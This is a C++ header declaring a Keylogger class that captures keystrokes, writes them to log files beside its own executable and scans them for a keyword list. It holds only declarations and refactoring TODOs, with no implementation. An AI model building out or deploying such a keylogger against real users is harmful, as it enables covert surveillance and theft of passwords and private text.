#pragma once

#include <string>
#include <fstream>
#include <vector>

#define FILEEXT ".log"
#define DEBUG
//#define DEBUG_TO_LOGS

std::vector<std::string> get_keywords();

class Keylogger
{
private:
	std::string intToString(int);
	//TODO: There should be a FILE_manager class that does the file related stuff. Keylogger shouldn't know about it (Single Responsibility Principle)
	std::string getSelfPath();
	std::string dirBasename(std::string);

	void save_to_file(std::ofstream &file_stream, const std::string &content);
	void look_for_keyword(std::string &_all_keys);
	std::string all_keys;

	std::string m_file_path;
	std::string m_file_path_clean_keys;
	std::ofstream file_logs_clean_keys;
	
	std::vector<std::string> keywords = { };

public:	
	Keylogger();
	Keylogger(bool save_enabled);
	Keylogger(bool save_enabled, std::vector<std::string> &_keywords);
	
	bool saving_enabled = false;
	void get_key(std::ofstream &file_logs); //TODO: It should return the key for File manager class, and not save it.
	std::string create_file(); //TODO: File manager class should handle it
	std::ofstream& get_file_logs_clean_keys();
	std::string get_path_to_clean_keys() { return m_file_path_clean_keys; }
};
